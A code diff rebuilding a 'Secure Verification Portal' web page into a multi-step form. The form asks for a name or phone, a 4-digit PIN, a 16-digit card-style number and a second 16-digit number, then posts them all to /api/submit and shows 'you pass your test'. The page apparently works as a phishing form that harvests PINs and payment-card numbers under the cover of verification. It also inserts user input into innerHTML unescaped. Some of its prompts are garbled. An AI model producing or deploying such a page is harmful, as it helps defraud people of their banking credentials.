@@ -6,8 +6,9 @@
     <title>Secure Verification Portal</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f7f6;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #000000;
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -15,140 +16,286 @@
             margin: 0;
         }
         .portal-container {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            background: #000000;
+            padding: 20px;
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
             box-sizing: border-box;
             text-align: center;
         }
         .logo-container img {
-            max-width: 100px;
-            height: auto;
-            margin-bottom: 15px;
+            width: 90px;
+            height: 90px;
+            object-fit: cover;
             border-radius: 50%;
+            margin-bottom: 30px;
         }
-        h2 {
-            margin-bottom: 20px;
-            color: #333;
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            font-style: italic;
+            letter-spacing: 1px;
+            margin-bottom: 35px;
+        }
+        h2, p.prompt-text {
+            font-size: 22px;
+            font-weight: normal;
+            margin-bottom: 25px;
+            line-height: 1.4;
         }
         .form-step {
             display: none;
-            text-align: left;
         }
         .form-step.active {
             display: block;
         }
-        label {
-            display: block;
-            margin-top: 15px;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #555;
-            font-size: 14px;
+        /* Toggle pill buttons */
+        .toggle-group {
+            display: flex;
+            background: #1c1c1e;
+            border-radius: 30px;
+            padding: 4px;
+            margin-bottom: 25px;
         }
-        input, select {
-            width: 100%;
+        .toggle-btn {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #8e8e93;
             padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 14px;
+            font-size: 16px;
+            border-radius: 26px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s ease;
         }
-        .button-group {
+        .toggle-btn.active {
+            background: #2c2c2e;
+            color: #ffffff;
+        }
+        /* Input fields */
+        .input-box {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #3a3a3c;
+            border-radius: 12px;
+            padding: 16px;
+            color: #ffffff;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-bottom: 25px;
+            outline: none;
+        }
+        .input-box:focus {
+            border-color: #0a84ff;
+        }
+        /* 4-digit PIN boxes */
+        .pin-container {
             display: flex;
             justify-content: space-between;
-            margin-top: 20px;
+            gap: 12px;
+            margin-bottom: 30px;
         }
-        button {
-            padding: 10px 15px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        .next-btn, .submit-btn {
-            background-color: #007bff;
+        .pin-digit {
+            width: 60px;
+            height: 60px;
+            background: transparent;
+            border: 1px solid #3a3a3c;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 24px;
             color: white;
+            outline: none;
+        }
+        .pin-digit:focus {
+            border-color: #0a84ff;
+        }
+        /* Action Button */
+        .continue-btn {
             width: 100%;
-            margin-top: 20px;
+            background: #e5e5ea;
+            color: #000000;
+            border: none;
+            border-radius: 30px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
         }
-        .next-btn:hover, .submit-btn:hover {
-            background-color: #0056b3;
+        .continue-btn:hover {
+            background: #ffffff;
         }
-        .button-group button {
-            width: 48%;
-        }
-        .back-btn {
-            background-color: #6c757d;
-            color: white;
-        }
-        .back-btn:hover {
-            background-color: #5a6268;
-        }
-        #responseMessage {
-            margin-top: 15px;
-            font-size: 14px;
+        /* Success Screen */
+        #successScreen {
+            display: none;
+            font-size: 26px;
             font-weight: bold;
+            color: #34c759;
+            margin-top: 40px;
+            line-height: 1.5;
         }
     </style>
 </head>
 <body>
     <div class="portal-container">
-        <!-- Logo Display Section -->
+        <!-- Logo Display -->
         <div class="logo-container">
-            <img src="logo.jpg" alt="Logo" class="portal-logo">
+            <img src="logo.jpg" alt="Logo" onerror="this.style.display='none'; document.getElementById('fallbackLogo').style.display='block';">
+            <div id="fallbackLogo" class="logo-text" style="display:none;">LOGO.JPG</div>
         </div>
-        
-        <h2>Secure Verification</h2>
-        
+
         <form id="verificationForm">
-            <!-- Step 1: Identifier -->
+            <!-- Step 1: Name or Phone Selection -->
             <div class="form-step active" id="step-1">
-                <label for="identifierType">Identifier Type:</label>
-                <select id="identifierType" name="identifierType" required>
-                    <option value="Email">Email</option>
-                    <option value="Username">Username</option>
-                    <option value="Phone">Phone</option>
-                </select>
+                <div class="toggle-group">
+                    <button type="button" class="toggle-btn active" id="btn-name" onclick="setIdentifierType('Name')">name</button>
+                    <button type="button" class="toggle-btn" id="btn-phone" onclick="setIdentifierType('Phone')">phone</button>
+                </div>
+                <input type="hidden" id="identifierType" name="identifierType" value="Name">
                 
-                <label for="identifierValue">Enter Value:</label>
-                <input type="text" id="identifierValue" name="identifierValue" required placeholder="Enter your identifier">
+                <input type="text" id="identifierValue" class="input-box" name="identifierValue" required placeholder="enter name or phone">
                 
-                <button type="button" class="next-btn" onclick="nextStep(2)">Next</button>
+                <button type="button" class="continue-btn" onclick="nextStep(2)">Continue</button>
             </div>
 
-            <!-- Step 2: PIN -->
+            <!-- Step 2: PIN Entry -->
             <div class="form-step" id="step-2">
-                <label for="pinText">Security PIN:</label>
-                <input type="password" id="pinText" name="pinText" maxlength="6" placeholder="Enter your PIN">
+                <p class="prompt-text" id="welcomeMsg">Welcome back, DEMO. Enter your <span style="font-style:italic;">TEXT</span> 1234 to continue.</p>
                 
-                <div class="button-group">
-                    <button type="button" class="back-btn" onclick="nextStep(1)">Back</button>
-                    <button type="button" class="next-btn" onclick="nextStep(3)">Next</button>
+                <div class="pin-container">
+                    <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 1)">
+                    <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 2)">
+                    <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 3)">
+                    <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" pattern="[0-9]*" required oninput="moveToNext(this, 4)">
                 </div>
+                <input type="hidden" id="pinText" name="pinText">
+
+                <button type="button" class="continue-btn" onclick="nextStep(3)">Continue</button>
             </div>
 
-            <!-- Step 3: Numeric Entries -->
+            <!-- Step 3: Numeric Number (1 to 16) -->
             <div class="form-step" id="step-3">
-                <label for="numericValue">Verification Code:</label>
-                <input type="number" id="numericValue" name="numericValue" placeholder="Enter numbers">
+                <p class="prompt-text">Enter 1 TO 16 BELOW IN number</p>
+                <input type="text" id="numericValue" class="input-box" placeholder="1234 1234 1234 1234" maxlength="19" oninput="formatCardNumber(this)">
                 
-                <label for="anyNumberValue">Additional Entry:</label>
-                <input type="number" id="anyNumberValue" name="anyNumberValue" placeholder="Enter optional digits">
+                <button type="button" class="continue-btn" onclick="nextStep(4)">Continue</button>
+            </div>
+
+            <!-- Step 4: Any Number (starting with 0000) -->
+            <div class="form-step" id="step-4">
+                <p class="prompt-text">Enter your <span style="font-style:italic;">any</span> number starting with <span style="font-style:italic;">0000</span></p>
+                <input type="text" id="anyNumberValue" class="input-box" value="0000 " placeholder="0000 0000 0000 0000" maxlength="19" oninput="enforcePrefix(this)">
                 
-                <div class="button-group">
-                    <button type="button" class="back-btn" onclick="nextStep(2)">Back</button>
-                    <button type="submit" class="submit-btn">Submit</button>
-                </div>
+                <button type="submit" class="continue-btn">Continue</button>
             </div>
         </form>
-        <div id="responseMessage"></div>
+
+        <!-- Success Message Screen -->
+        <div id="successScreen">
+            weldon kid you pass your test
+        </div>
     </div>
-    
-    <script src="script.js"></script>
+
+    <script>
+        function setIdentifierType(type) {
+            document.getElementById('identifierType').value = type;
+            if (type === 'Name') {
+                document.getElementById('btn-name').classList.add('active');
+                document.getElementById('btn-phone').classList.remove('active');
+                document.getElementById('identifierValue').placeholder = "enter name";
+            } else {
+                document.getElementById('btn-phone').classList.add('active');
+                document.getElementById('btn-name').classList.remove('active');
+                document.getElementById('identifierValue').placeholder = "enter phone number";
+            }
+        }
+
+        function nextStep(stepNumber) {
+            // Validation before moving
+            if (stepNumber === 2) {
+                const val = document.getElementById('identifierValue').value.trim();
+                if (!val) {
+                    alert('Please enter your name or phone.');
+                    return;
+                }
+                // Update welcome message dynamically with entered name/phone
+                document.getElementById('welcomeMsg').innerHTML = `Welcome back, <span style="font-style:italic;">${val}</span>. Enter your PIN to continue.`;
+            }
+
+            if (stepNumber === 3) {
+                const digits = document.querySelectorAll('.pin-digit');
+                let pin = '';
+                digits.forEach(d => pin += d.value);
+                if (pin.length < 4) {
+                    alert('Please enter your complete 4-digit PIN.');
+                    return;
+                }
+                document.getElementById('pinText').value = pin;
+            }
+
+            // Switch steps
+            document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step-' + stepNumber).classList.add('active');
+        }
+
+        // Auto-focus next digit box for PIN
+        function moveToNext(current, index) {
+            if (current.value.length === 1 && index < 4) {
+                current.parentElement.children[index].focus();
+            }
+        }
+
+        // Auto-format spacing for numeric entries
+        function formatCardNumber(input) {
+            let v = input.value.replace(/\D/g, '').substring(0, 16);
+            v = v.replace(/(.{4})/g, '$1 ').trim();
+            input.value = v;
+        }
+
+        function enforcePrefix(input) {
+            if (!input.value.startsWith("0000")) {
+                input.value = "0000 ";
+            }
+            let v = input.value.replace(/\D/g, '');
+            if (v.startsWith("0000")) {
+                v = v.substring(0, 16);
+                input.value = v.replace(/(.{4})/g, '$1 ').trim();
+            }
+        }
+
+        // Final Form Submission to Server
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const formData = {
+                identifierType: document.getElementById('identifierType').value,
+                identifierValue: document.getElementById('identifierValue').value,
+                pinText: document.getElementById('pinText').value,
+                numericValue: document.getElementById('numericValue').value,
+                anyNumberValue: document.getElementById('anyNumberValue').value
+            };
+
+            try {
+                const response = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+                const result = await response.json();
+
+                if (result.success) {
+                    // Hide form and show success message
+                    document.getElementById('verificationForm').style.display = 'none';
+                    document.getElementById('successScreen').style.display = 'block';
+                } else {
+                    alert('Submission error. Please try again.');
+                }
+            } catch (err) {
+                console.error('Network error:', err);
+                alert('An error occurred connecting to the server.');
+            }
+        });
+    </script>
 </body>
 </html>
